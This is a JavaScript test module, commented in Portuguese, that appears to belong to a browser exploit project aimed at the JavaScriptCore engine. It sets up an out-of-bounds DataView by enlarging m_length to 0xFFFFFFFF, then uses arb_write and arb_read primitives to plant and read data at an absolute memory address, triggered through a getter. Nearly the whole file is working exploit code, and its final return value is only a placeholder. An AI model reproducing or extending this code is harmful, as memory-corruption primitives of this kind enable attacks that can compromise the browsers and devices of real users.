// js/script3/testArrayBufferVictimCrash.mjs (Atualizado para usar arb_read/arb_write do core_exploit v31)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Ainda usado para checagens de limites pelo getter ao copiar
    oob_dataview_real,     // Não usado diretamente pelo getter para a leitura arbitrária
    oob_write_absolute,    // Usado para plantar e copiar DENTRO do oob_array_buffer_real
    oob_read_absolute,     // Usado pelo getter para ler o endereço de oob_array_buffer_real[0x68]
    clearOOBEnvironment,
    isOOBReady,
    arb_read,              // <-- NOVA PRIMITIVA DO CORE_EXPLOIT
    arb_write              // <-- NOVA PRIMITIVA DO CORE_EXPLOIT
} from '../core_exploit.mjs'; // Deve ser a versão v31 com arb_read/write async e reset interno
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // JSC_OFFSETS não é usado aqui, mas mantido do original

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v31_UsingCoreArbRW"; // Nome do módulo atualizado

// Constantes do seu script original
const ADDR_PART_HIGH_PLANT_OFFSET = 0x68; // Onde plantamos o ENDEREÇO ABSOLUTO que o getter deve ler
const TRIGGER_WRITE_OFFSET = 0x70;        // Offset para m_length do oob_dataview_real
const TRIGGER_WRITE_VALUE = 0xFFFFFFFF;   // Para expandir m_length

const DATA_COPY_DEST_OFFSET_IN_OOB = 0x0100; // Onde o getter copiará os dados lidos via arb_read

// Novo: Endereço absoluto alvo para a leitura arbitrária e dados a serem plantados lá
const TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ = new AdvancedInt64(0x00000D00, 0x00000000); // 0xD00, sabemos que é R/W
const TARGET_DATA_FOR_ARB_READ_LOW = 0xCAFED00D;
const TARGET_DATA_FOR_ARB_READ_HIGH = 0xBEADFACE;
const TARGET_DATA_FOR_ARB_READ = new AdvancedInt64(TARGET_DATA_FOR_ARB_READ_LOW, TARGET_DATA_FOR_ARB_READ_HIGH);

let getter_object_ref = null;
let address_targeted_by_getter = null; // Será o TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ
let data_successfully_read_and_copied_by_getter = false;

async function ArbReadGetterReattemptUpdated() { // Agora async devido ao arb_read
    logS3(`>>>> [ArbReadGetterReattemptUpdated ACIONADO!] <<<<`, "vuln", `${FNAME_MODULE_V28}.Getter`);
    data_successfully_read_and_copied_by_getter = false;
    address_targeted_by_getter = null;
    let data_read_via_arb = null;

    try {
        // 1. Getter lê o QWORD de ADDR_PART_HIGH_PLANT_OFFSET (oob_buffer[0x68]).
        // Esperamos que contenha o TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ.
        const absolute_address_to_read = oob_read_absolute(ADDR_PART_HIGH_PLANT_OFFSET, 8);
        if (!isAdvancedInt64Object(absolute_address_to_read)) {
             logS3(`    [${FNAME_MODULE_V28}.Getter] Valor lido de ${toHex(ADDR_PART_HIGH_PLANT_OFFSET)} não é AdvancedInt64.`, "error");
             return "getter_error_reading_target_addr_qword";
        }
        address_targeted_by_getter = absolute_address_to_read;
        logS3(`    [${FNAME_MODULE_V28}.Getter] Endereço Absoluto Alvo para Leitura (lido de ${toHex(ADDR_PART_HIGH_PLANT_OFFSET)}): ${address_targeted_by_getter.toString(true)}`, "leak");

        // 2. Usar arb_read do core_exploit para ler do endereço absoluto obtido.
        logS3(`    [${FNAME_MODULE_V28}.Getter] Tentando ler 8 bytes de ${address_targeted_by_getter.toString(true)} via arb_read...`, "info");
        data_read_via_arb = await arb_read(address_targeted_by_getter, 8); // arb_read é async
        logS3(`    [${FNAME_MODULE_V28}.Getter] Dados lidos via arb_read: ${isAdvancedInt64Object(data_read_via_arb) ? data_read_via_arb.toString(true) : "ERRO_ARB_READ"}`, "leak");

        // 3. Copiar os dados lidos para DATA_COPY_DEST_OFFSET_IN_OOB (dentro do oob_array_buffer_real)
        // oob_write_absolute é síncrona e opera no oob_array_buffer_real.
        // Após arb_read, o DV deve estar restaurado para operar no oob_array_buffer_real.
        if (isAdvancedInt64Object(data_read_via_arb)) {
            if (DATA_COPY_DEST_OFFSET_IN_OOB + 8 <= oob_array_buffer_real.byteLength) {
                oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, data_read_via_arb, 8);
                data_successfully_read_and_copied_by_getter = true;
                logS3(`    [${FNAME_MODULE_V28}.Getter] Dados lidos via arb_read copiados para oob_buffer[${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}].`, "info");
            } else {
                logS3(`    [${FNAME_MODULE_V28}.Getter] ERRO: DATA_COPY_DEST_OFFSET_IN_OOB fora dos limites do oob_array_buffer_real.`, "error");
            }
        } else {
            logS3(`    [${FNAME_MODULE_V28}.Getter] Não foi possível copiar dados pois a leitura arbitrária falhou.`, "error");
        }

    } catch (e) {
        logS3(`    ERRO DENTRO DO ArbReadGetterReattemptUpdated: ${e.name} - ${e.message}\n${e.stack ? e.stack : ''}`, "critical", `${FNAME_MODULE_V28}.Getter`);
    }
    return "arb_read_getter_v31_executed";
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.attemptArbitraryReadViaCorePrimitives`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Usando Primitivas arb_read/write do Core (v31) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    address_targeted_by_getter = null;
    data_successfully_read_and_copied_by_getter = false;
    getter_object_ref = {};

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        address_planted_for_getter_str: TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ.toString(true),
        data_planted_at_target_addr_str: TARGET_DATA_FOR_ARB_READ.toString(true),
        copied_data_str: null,
        message: "Teste não iniciado."
    };

    try {
        // PASSO 0: Inicializar ambiente OOB. arb_write/arb_read também chamarão triggerOOB se necessário.
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { 
            throw new Error("OOB Init inicial falhou ou ambiente não está pronto."); 
        }
        logS3("Ambiente OOB inicializado e pronto.", "info", FNAME_CURRENT_TEST);

        // PASSO 1a: Plantar dados de teste no TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ usando arb_write.
        logS3(`PASSO 1a: Plantando dados ${exploit_result.data_planted_at_target_addr_str} no endereço absoluto ${TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ.toString(true)} via arb_write...`, "info", FNAME_CURRENT_TEST);
        await arb_write(TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ, TARGET_DATA_FOR_ARB_READ, 8);
        logS3(`  Dados (supostamente) plantados no endereço absoluto.`, "info", FNAME_CURRENT_TEST);

        // PASSO 1b: Plantar o TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ em oob_buffer[0x68] para o getter ler.
        logS3(`PASSO 1b: Plantando endereço ${TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ.toString(true)} em oob_buffer[${toHex(ADDR_PART_HIGH_PLANT_OFFSET)}] (para o getter).`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(ADDR_PART_HIGH_PLANT_OFFSET, TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ, 8); 
        
        // Limpar local de cópia no oob_array_buffer_real
        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0,0), 8);

        // PASSO 2: Definir o getter. Ele agora será async.
        Object.defineProperty(getter_object_ref, 'triggerUpdatedRead', { // Nome da propriedade atualizado
            get: ArbReadGetterReattemptUpdated, // Getter atualizado
            configurable: true
        });
        logS3("PASSO 2: Getter 'triggerUpdatedRead' definido.", "info", FNAME_CURRENT_TEST);

        // PASSO 3: Escrita OOB de trigger em TRIGGER_WRITE_OFFSET (m_length do oob_dataview_real)
        // Isso é feito por triggerOOB_primitive, mas uma escrita explícita aqui não faz mal se quisermos garantir.
        // No entanto, o core_exploit já garante que m_length é 0xFFFFFFFF após triggerOOB_primitive.
        // Esta linha é provavelmente redundante se triggerOOB_primitive funcionou.
        // logS3(`PASSO 3: Escrevendo valor de trigger ${toHex(TRIGGER_WRITE_VALUE)} em oob_buffer[${toHex(TRIGGER_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        // oob_write_absolute(TRIGGER_WRITE_OFFSET, TRIGGER_WRITE_VALUE, 4);
        // logS3(`  Escrita de trigger para m_length realizada (redundante se triggerOOB_primitive funcionou).`, "info", FNAME_CURRENT_TEST);

        logS3("PASSO 4: Tentando acionar o getter acessando getter_object_ref.triggerUpdatedRead...", "warn", FNAME_CURRENT_TEST);
        let getter_return_value;
        try {
            // O getter agora é async por causa do arb_read, mas o acesso à propriedade do getter não é `await`
            // A função getter em si será chamada, e se ela contiver `await`, ela retornará uma Promise.
            // Para este teste, vamos esperar que o getter complete suas operações internas (incluindo awaits).
            // Acessar o getter irá dispará-lo.
            getter_object_ref.triggerUpdatedRead; // Dispara o getter
            // Precisamos de uma forma de saber quando o getter (que é async) terminou.
            // Para simplificar este teste e manter a estrutura do seu getter, vamos adicionar uma pausa aqui
            // para dar tempo ao getter de completar suas operações async antes de verificarmos as flags.
            logS3("  Getter acionado. Pausando para permitir operações async do getter...", "info", FNAME_CURRENT_TEST);
            await PAUSE_S3(500); // Pausa para o getter async completar (arb_read interno)
            getter_return_value = "getter_async_call_initiated"; // Placeholder
            logS3(`  Pausa concluída. Verificando resultados do getter...`, "info", FNAME_CURRENT_TEST);

        } catch (e_getter_access) {
            logS3(`  ERRO ao tentar acionar o getter: ${e_getter_access.name} - ${e_getter_access.message}`, "error", FNAME_CURRENT_TEST);
        }

        // As flags são setadas dentro do getter.
        exploit_result.address_targeted_by_getter_str = address_targeted_by_getter ? address_targeted_by_getter.toString(true) : "N/A";

        if (data_successfully_read_and_copied_by_getter) {
            const copied_data = oob_read_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, 8);
            exploit_result.copied_data_str = isAdvancedInt64Object(copied_data) ? copied_data.toString(true) : "ERRO_LEITURA_COPIA";
            logS3(`PASSO 5: Dados copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}: ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);

            if (exploit_result.copied_data_str === exploit_result.data_planted_at_target_addr_str) {
                exploit_result.success = true;
                exploit_result.message = "SUCESSO! Getter leu endereço absoluto de 0x68, arb_read leu dados desse endereço, e foram copiados corretamente!";
                document.title = `${FNAME_MODULE_V28}: ARB.READ VIA GETTER OK!`;
                logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                exploit_result.message = `Dados copiados (${exploit_result.copied_data_str}), mas não correspondem aos dados plantados no endereço absoluto (${exploit_result.data_planted_at_target_addr_str}).`;
                document.title = `${FNAME_MODULE_V28}: Cópia Incorreta`;
            }
        } else {
            exploit_result.message = `Getter foi acionado, mas os dados não foram marcados como lidos/copiados com sucesso. Endereço alvo que o getter usou: ${exploit_result.address_targeted_by_getter_str}.`;
            logS3(`  ${exploit_result.message}`, "warn", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Falha Leitura/Cópia Getter`;
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Leitura Arbitrária via Getter (Core Primitives v31): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Endereço Lido pelo Getter (de 0x68): ${exploit_result.address_targeted_by_getter_str}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Dados Plantados em End. Absoluto ${TARGET_ABSOLUTE_ADDRESS_FOR_ARB_READ.toString(true)}: ${exploit_result.data_planted_at_target_addr_str}`, "info", FNAME_CURRENT_TEST);
        if(exploit_result.copied_data_str) logS3(`  Dados Copiados (de ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}): ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);
        getter_object_ref = null;
    }

    return { /* ... objeto de resultado ... */ };
}
